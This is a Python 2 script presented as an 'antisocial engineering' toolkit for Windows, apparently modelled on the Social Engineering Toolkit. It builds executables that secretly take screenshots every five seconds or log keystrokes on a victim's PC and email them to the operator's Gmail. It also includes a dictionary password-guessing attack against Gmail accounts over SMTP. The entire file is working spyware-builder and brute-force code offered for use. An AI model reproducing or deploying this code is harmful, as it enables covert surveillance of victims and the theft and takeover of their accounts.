import os
import subprocess
import py2exe
import time
import random
import smtplib
import itertools
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
import pyHook
import pythoncom



#This is an open source framework and strictly command-line based
#Only for windows!
#It is brought to you by IeroS9 and I hope for this program to get bigger with more tools
#I hope this collection of tools to be a framework one day but for now It is just a collection of tools
#inspired by SET(Social Engineering Toolkit)

print"  ___        _   _                _       _   _____            _            "
print" / _ \      | | (_)              (_)     | | |  ___|          (_)           "
print"/ /_\ \_ __ | |_ _ ___  ___   ___ _  __ _| | | |__ _ __   __ _ _ _ __   ___ "
print"|  _  | '_ \| __| / __|/ _ \ / __| |/ _` | | |  __| '_ \ / _` | | '_ \ / _ \ "
print"| | | | | | | |_| \__ \ (_) | (__| | (_| | | | |__| | | | (_| | | | | |  __/ "
print"\_| |_/_| |_|\__|_|___/\___/ \___|_|\__,_|_| \____/_| |_|\__, |_|_| |_|\___| "
print"                                                          __/ |             "
print"                                                         |___/              "

print "This is an open source toolkit and strictly command-line based"
print ""                                               
print "It is brought to you by IeroS9 and I hope for this program to get bigger with more tools"
print ""                                                 
print "This collections of tools someday will be a framework but for now"
print "It is just a collection of tools"
print ""                                                 
print "inspired by SET(Social Engineering Toolkit) but I wanted to make something more simple"
print "and Windows based!"
print""
print "It is self explanatory and you will not have any problem "
print ""                                                
print "You just type some information and the program makes an exe to your hard drive "
print "for you to take It and place It wherever you want"
print "Enjoy!!" 
print ""
print ""


def choose():

    print "1)Screenshots From a Remote PC to your gmail"
    print "2)Keylogger From a Remote PC to your gmail"
    print "3)Dictionary attack to gmail"
    print""
    print""

    chose=raw_input("Choose one of the three options, (Example:1) :")

    if chose=='1':
        screen()

    elif chose=='2':
        keylogger()

    elif chose=='3':
        dictionary()
       
    else:
        print""
        print"Sorry, that was an invalid command!"
        print""
        choose()

def screen():
         
    
    print"  _________                                  .__        "
    print" /   _____/ ___________   ____   ____   ____ |__| ____  "
    print" \_____  \_/ ___\_  __ \_/ __ \_/ __ \ /    \|  |/ __ \ "
    print" /        \  \___|  | \/\  ___/\  ___/|   |  \  \  ___/ "
    print"/_______  /\___  >__|    \___  >\___  >___|  /__|\___  >"
    print"        \/     \/            \/     \/     \/        \/    "


    print"This is Screenie"
    print""
    print"Screenie is for remote screenshot capturing"
    print"After you write your username and your password of your gmail"
    print"then Screenie store a Screenie exe to your C drive"
    print"for you to be able to take this exe and make some antisocial enginering"
    print""

    infile=open('C:\\Mail.py', "wb")
    type(infile)

    name=raw_input("What is your email? Example 'bla@gmail.com' :")
    password=raw_input("What is your password? Example '1234' :")

    infile.write('#!/usr/bin/python\r\n\r\nimport smtplib\r\nfrom email.MIMEMultipart import MIMEMultipart\r\nfrom email.MIMEBase import MIMEBase\r\nfrom email.MIMEText import MIMEText\r\nfrom email import Encoders\r\nimport os\r\nimport time\r\n\r\ngmail_user ='+name+'\r\ngmail_pwd ='+password+'\r\n\r\n\r\n\r\ndef mail(to, subject, text, attach):\r\n\r\n   \r\n   import autopy\r\n\r\n   bitmap = autopy.bitmap.capture_screen()\r\n   bitmap.save(\'C:\\screenshot.png\')\r\n\r\n   msg = MIMEMultipart()\r\n   msg[\'From\'] = gmail_user\r\n   msg[\'To\'] = gmail_user\r\n   msg[\'Subject\'] = subject\r\n\r\n   msg.attach(MIMEText(text))\r\n\r\n   part = MIMEBase(\'application\', \'octet-stream\')\r\n   part.set_payload(open(attach, \'rb\').read())\r\n   Encoders.encode_base64(part)\r\n   part.add_header(\'Content-Disposition\',\r\n           \'attachment; filename="%s"\' % os.path.basename(attach))\r\n   msg.attach(part)\r\n\r\n   mailServer = smtplib.SMTP("smtp.gmail.com", 587)\r\n   mailServer.ehlo()\r\n   mailServer.starttls()\r\n   mailServer.ehlo()\r\n   mailServer.login(gmail_user, gmail_pwd)\r\n   mailServer.sendmail(gmail_user,gmail_user, msg.as_string())\r\n   # Should be mailServer.quit(), but that crashes...\r\n   mailServer.close()\r\n\r\ndef main():\r\n      while True:\r\n         \r\n         mail("some.person@some.address.com",\r\n         "Antisocial Engineering",\r\n         "This is an evil email",\r\n         "C:\\screenshot.png")\r\n         time.sleep(5)\r\n\r\nif __name__==\'__main__\':\r\n    main()\r\n\r\n\r\n\r\n')
    infile.close()
    print"Please Wait..."
    time.sleep(3)

    os.chdir('C:\\')
    subprocess.call(['pyinstaller.exe', '--onefile', 'Mail.py'])

    print"Please Wait..."
    time.sleep(5)
    
   


def keylogger():

    print" ____  __.            .__         "
    print"|    |/ _|____ ___.__.|  | ___.__."
    print"|      <_/ __ <   |  ||  |<   |  |"
    print"|    |  \  ___/\___  ||  |_\___  |"
    print"|____|__ \___  > ____||____/ ____|"
    print"        \/   \/\/          \/     "

    print"This is Keyly"
    print""
    print"Keyly is for remote keylogging"
    print"After you write your username and your password of your gmail"
    print"then Keyly store a Keyly exe to your C drive"
    print"for you to be able to take this exe and make some antisocial enginering"
    print""

    infile=open('C:\\Key.py', "wb")
    type(infile)

    email=raw_input("What is your email? Example 'bla@gmail.com' :")
    passw=raw_input("What is your password? Example '1234' :")
    title=raw_input("What is your title? Example 'title' :")

    infile.write('import smtplib\r\nimport pyHook\r\nimport pythoncom\r\n\r\n\r\nclass Keylogger:\r\n    \r\n\r\n    def __init__(self):\r\n        self.keylog = \'\'\r\n\r\n    def OnKeyboardEvent(self, event):\r\n        self.keylog += str(event.Key)\r\n        if len(self.keylog) >= 500:  # Check size of the keystrokes captured\r\n            # MAIL STUFF\r\n            self.send_email(\'smtp.gmail.com\', 587,  email, passw, title, self.keylog)\r\n            self.keylog = \'\'  # Reset keylog to capture new keystrokes\r\n        return True\r\n\r\n    def send_email(self, server, port, email, password, subject, body):\r\n        session = smtplib.SMTP(server, port)\r\n        session.ehlo()\r\n        session.starttls()\r\n        session.ehlo()\r\n        session.login(email, password)\r\n\r\n        headers = [\r\n            "From: " + email,\r\n            "Subject: " + subject,\r\n            "To: " + email,\r\n            "MIME-Version: 1.0",\r\n            "Content-Type: text/html"\r\n        ]\r\n        headers = "\\r\\n".join(headers)\r\n\r\n        session.sendmail(email, email, headers + "\\r\\n\\r\\n" + body)\r\n        session.close()\r\n\r\nif __name__ == \'__main__\':\r\n    # Entry Point\r\n    hook_manager = pyHook.HookManager()     # Create a new hook manager\r\n    hook_manager.KeyDown = Keylogger().OnKeyboardEvent  # Assign the keydown event to our custom method\r\n    hook_manager.HookKeyboard()             # Hook the keyboard events\r\n    pythoncom.PumpMessages()                # Run forever\r\n')
    infile.close()
    print"Please Wait..."
    time.sleep(3)

    os.chdir('C:\\')
    subprocess.call(['pyinstaller.exe', '--onefile', 'Key.py'])
        
        

def dictionary():
    
    
    print"                                                      "                                        
    print"  ________  .__        __          __                 "
    print"  \______ \ |__| _____/  |______ _/  |_  ___________  "
    print"   |    |  \|  |/ ___\   __\__  \\   __\/  _ \_  __ \ "
    print"   |    `   \  \  \___|  |  / __ \|  | (  <_> )  | \/ "
    print"  /_______  /__|\___  >__| (____  /__|  \____/|__|    "
    print"          \/        \/          \/                    "
    print""
    print""
    print"Dictionary Gmail attack"
    print""
    print"Please Wait..."
    print""

    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()
     
    user=raw_input("email address :")
    passwfile=raw_input("Password File Path :")
    passwfile=open(passwfile, "r")


    for password in passwfile:

        try:
            smtpserver.login(user, password)
             
            print"Password found ", password
            break;           
        
        except smtplib.SMTPAuthenticationError:
            print "Password Incorrect", password
    raw_input()


if __name__=='__main__':
    choose()



